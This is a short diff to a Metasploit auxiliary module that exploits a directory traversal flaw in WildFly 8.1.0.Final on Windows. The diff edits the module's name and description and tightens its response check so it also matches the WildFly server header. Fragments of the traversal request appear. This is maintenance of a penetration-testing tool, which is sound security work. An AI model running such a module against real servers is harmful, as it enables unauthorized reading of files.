@@ -13,10 +13,11 @@ class Metasploit3 < Msf::Auxiliary
 
   def initialize(info = {})
     super(update_info(info,
-      'Name'           => 'WildFly 8 (JBossAS) Directory Traversal',
+      'Name'           => 'WildFly 8 Directory Traversal',
       'Description'    => %q{
-        This module exploits a directory traversal vulnerability found in WildFly
-        8.1.0.Final webserver on port 8080.
+        This module exploits a directory traversal vulnerability found in the WildFly 8.1.0.Final
+        web server running on port 8080, named JBoss Undertow. The vulnerability only affects to
+        Windows systems.
       },
       'References'     =>
         [
@@ -47,7 +48,10 @@ class Metasploit3 < Msf::Auxiliary
       'uri'    => "/#{traversal}\\#{datastore['RELATIVE_FILE_PATH']}"
     })
 
-    if res && res.code == 200
+    if res &&
+        res.code == 200 &&
+        res.headers['Server'] &&
+        res.headers['Server'] =~ /WildFly/
       vprint_line(res.to_s)
       fname = File.basename(datastore['RELATIVE_FILE_PATH'])
 
